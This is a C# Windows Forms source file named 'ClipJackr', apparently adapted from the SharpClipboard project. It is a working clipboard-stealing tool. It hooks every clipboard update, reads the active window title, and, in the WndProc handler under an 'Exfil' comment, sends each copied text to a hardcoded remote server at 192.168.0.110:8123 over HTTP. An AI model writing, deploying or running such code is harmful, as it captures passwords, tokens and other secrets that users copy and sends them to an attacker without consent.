using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;

/// <summary>
/// ClipJackr
/// </summary>

// https://github.com/slyd0g/SharpClipboard

namespace WindowsFormsApp1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            //Turn the child window into a message-only window (refer to Microsoft docs)
            //NativeMethods.SetParent(Handle, NativeMethods.HWND_MESSAGE);
            //Place window in the system-maintained clipboard format listener list
            NativeMethods.AddClipboardFormatListener(Handle);
            TopMost = true;
        }
        protected override void WndProc(ref Message m)
        {
            //Listen for operating system messages
            if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
            {
                //Get the date and time for the current moment expressed as coordinated universal time (UTC).
                //DateTime saveUtcNow = DateTime.UtcNow;
                // Console.WriteLine("Copy event detected at {0} (UTC)!", saveUtcNow);

                //Write to stdout active window
                IntPtr active_window = NativeMethods.GetForegroundWindow();
                int length = NativeMethods.GetWindowTextLength(active_window);
                StringBuilder sb = new StringBuilder(length + 1);
                NativeMethods.GetWindowText(active_window, sb, sb.Capacity);
                // Console.WriteLine("Clipboard Active Window: " + sb.ToString());

                // Add clipboard contents to Rich Text Box.
                var cliptext = Clipboard.GetText();
                richTextBox1.AppendText(cliptext);
                // Exfil.. Send to remote server.
                // webserver must return a 200 response on all requests.
                var request = (HttpWebRequest)WebRequest.Create("http://192.168.0.110:8123/"+cliptext);
                WebResponse response = request.GetResponse();
                response.Close();

            }
            //Called for any unhandled messages
            base.WndProc(ref m);
        }
    }

}
